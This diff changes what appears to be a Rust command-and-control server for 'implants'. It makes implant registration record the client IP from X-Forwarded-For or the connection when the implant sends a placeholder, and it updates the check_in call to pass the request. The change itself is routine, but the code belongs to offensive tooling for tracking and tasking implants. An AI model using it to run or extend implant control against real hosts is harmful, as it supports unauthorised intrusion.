@@ -78,6 +78,7 @@ pub async fn example_imp_action(req: HttpRequest, db: Data<Arc<Mutex<Connection>
 //this function is used to verify implant secrets and issue new session tokens for imps
 //it also therefor collects all implant info via the ImpInfo struct, and inserts it into the imps table in the database
 pub async fn registration(
+    req: &HttpRequest,  // Add this parameter
     db: Data<Arc<Mutex<Connection>>>,
     imp_info: &ImpInfo,
     imp_token: String,
@@ -87,6 +88,24 @@ pub async fn registration(
 
     // Get current server time
     let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+
+    // Create a mutable copy of imp_info to modify the IP
+    let mut imp_info = imp_info.clone();
+    
+    // If the IP is the placeholder, replace it with the actual client IP
+    if imp_info.ip == "{{SERVER_REPLACE_IP}}" {
+        // First check X-Forwarded-For header (for proxy cases)
+        // Then fall back to direct connection info if header isn't present
+        imp_info.ip = req.headers()
+            .get("X-Forwarded-For")
+            .and_then(|h| h.to_str().ok())
+            .and_then(|s| s.split(',').next())
+            .unwrap_or_else(|| {
+                req.connection_info().peer_addr()
+                    .unwrap_or("unknown")
+            })
+            .to_string();
+    }
 
     // Insert the Imp info into the database
     conn.execute(
@@ -967,7 +986,7 @@ pub async fn check_in(
                     let imp_token_clone = imp_token.clone();
                     //register, but we'll move tasks to a separate function
                     let register_result =
-                        registration(db_clone, &imp_info, imp_token).await; //make sure to update with the new token requirement
+                        registration(&req, db_clone, &imp_info, imp_token).await; //make sure to update with the new token requirement
                                                                                          //move this to subsequent check_in
                                                                                          //let tasks_result = check_tasks(db, imp_info_clone.session.clone()).await; //make sure to update with the new token requirement
                                                                                          // Expect both registration and check_tasks to return successfully
